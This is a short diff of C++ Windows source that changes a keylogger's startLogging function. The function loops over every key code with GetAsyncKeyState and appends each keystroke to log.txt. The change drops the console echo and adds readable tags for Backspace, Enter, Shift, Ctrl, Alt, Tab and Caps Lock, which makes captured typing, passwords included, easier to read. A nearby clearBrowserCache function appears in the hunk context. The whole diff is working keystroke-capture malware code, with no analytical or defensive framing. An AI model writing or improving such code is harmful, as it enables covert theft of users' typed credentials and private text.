@@ -28,16 +28,41 @@ void clearBrowserCache(){
 
 void startLogging(){
 
-    std::ofstream logg;
-    logg.open("log.txt", std::ios::app);
+    std::ofstream log;
+    log.open("log.txt", std::ios::app);
     
     while(true){
         for (int i = 0x08; i <= 0xFE; i++){
             if (GetAsyncKeyState(i) & 0x8000) {
-                std::cout << char(i);
-                logg << char(i);
-                logg.flush();
-                Sleep(100);
+                switch (i) {
+                    case VK_BACK:
+                        log << "[backspace]";
+                        break;
+                    case VK_RETURN:
+                        log << "[enter]";
+                        break;
+                    case VK_SHIFT:
+                        log << "[shift]";
+                        break;
+                    case VK_CONTROL:
+                        log << "[control]";
+                        break;
+                    case VK_CAPITAL:
+                        log << "[cap]";
+                        break;
+                    case VK_TAB:
+                        log << "[tab]";
+                        break;
+                    case VK_MENU:
+                        log << "[alt]";
+                        break;
+                    case VK_LBUTTON:
+                    case VK_RBUTTON:
+                        break;
+                    default:
+                        log << char(i);
+                }
+            Sleep(100);
             }
         }
     }
